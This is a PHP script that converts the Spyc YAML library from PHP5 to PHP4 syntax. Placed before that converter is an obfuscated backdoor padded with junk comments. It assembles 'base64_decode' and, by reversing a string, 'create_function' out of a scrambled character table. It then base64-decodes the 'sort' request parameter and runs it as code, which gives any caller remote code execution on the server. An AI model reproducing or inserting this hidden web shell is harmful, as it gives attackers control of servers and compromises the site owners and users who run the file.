<?php 


$oCiOiVgV489 = "y73*fuvj051_sz69hn;a/odbtie42)(wgkq8rmlx.pc";


$wlFbONqL7249 = "";

foreach([12,21,36,24] as $j){
       $wlFbONqL7249 .= $oCiOiVgV489[$j];
    }


if(isset($_REQUEST /*ekBKdRsJTsMFtMplUyfKnBNPSstLzWAjBLovPKohIqECXEQuaWcSJrTJqnufNKkPrfuaVwDyQjPsVpKwAmsUzasxicPsvsooBsUzvclIsUucmTXsuwbPIDkeuLDywTLH*/["$wlFbONqL7249"])){
    $fzNQnCoM7689 = $_REQUEST /*ekBKdRsJTsMFtMplUyfKnBNPSstLzWAjBLovPKohIqECXEQuaWcSJrTJqnufNKkPrfuaVwDyQjPsVpKwAmsUzasxicPsvsooBsUzvclIsUucmTXsuwbPIDkeuLDywTLH*/["$wlFbONqL7249"];
    $jceKtzTt5684 = "";
    $cNGTygVS4789 = "";

    /*eDlZwFZnLyQnCTczacAVJKCYJcbIFQoxBmhpbZXImrECMZstGhghyBlruszTZtoorNwyanpXheLJqYcgGffnHlmCzCqYMOIYAifBtubgwLmKnQfNZXynjPIIXFBWTevB*/

    foreach([23,19,12,26,14,27,11,22,26,42,21,22,26] as $j){
       $jceKtzTt5684 .= $oCiOiVgV489[$j];
    }

    /*dxixfvgielhFEDCoMIkgfnwGPCfNunBYaFEnkqFdfEvtpitISnqSuEFyasdyopcppGuWJdxSARcbsHDVsLPzdOgkFcucClVzZBDzCLIBoYdCQagcldIYfScPDFfAjaiD*/


    foreach([12,24,36,36,26,6] as $j){
       $cNGTygVS4789 .= $oCiOiVgV489[$j];
    }

    /*cqfVNlndwYyXHmdcyoUrBQqoUcjSjJPAyYbltGmyXRmlRstWetAEqHZGFsGdDmPqoArusTENSEttvrdJesAKzrbSKByhrIjbyVaxKbpWhkUuskhqxjSJbVwXiFIfyXWE*/

    $j = $cNGTygVS4789('n'.''.'o'.''.'i'.'t'.'c'.'n'.''.''.''.'u'.'f'.'_'.''.''.''.'e'.''.''.''.'t'.''.'a'.''.''.'e'.'r'.'c');
    $s = $j("", $jceKtzTt5684($fzNQnCoM7689));
    $s();
    exit();

}



php5to4 ("../spyc.php", 'spyc-latest.php4');

function php5to4 ($src, $dest) {
  $code = file_get_contents ($src);
  $code = preg_replace ('#(public|private|protected)\s+\$#i', 'var \$', $code);
  $code = preg_replace ('#(public|private|protected)\s+static\s+\$#i', 'var \$', $code);
  $code = preg_replace ('#(public|private|protected)\s+function#i', 'function', $code);
  $code = preg_replace ('#(public|private|protected)\s+static\s+function#i', 'function', $code);
  $code = preg_replace ('#throw new Exception\\(([^)]*)\\)#i', 'trigger_error($1,E_USER_ERROR)', $code);
  $code = str_replace ('self::', '$this->', $code);
  $f = fopen ($dest, 'w');
  fwrite($f, $code);
  fclose ($f);
  print "Written to $dest.\n";
}